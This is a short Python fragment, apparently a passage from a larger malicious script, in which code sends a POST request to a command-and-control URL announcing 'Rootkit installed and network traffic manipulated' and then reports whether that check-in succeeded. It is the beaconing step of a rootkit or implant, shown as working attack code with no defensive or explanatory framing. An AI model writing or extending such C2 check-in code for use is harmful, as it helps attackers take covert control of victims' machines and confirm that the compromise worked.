    try:
        response = requests.post(c2_url, data={'status': 'Rootkit installed and network traffic manipulated.'})
        if response.status_code == 200:
            print('C2 communication successful.')
        else:
            print('C2 communication failed.')
    except Exception as e:
        print(f'C2 communication error: {e}')
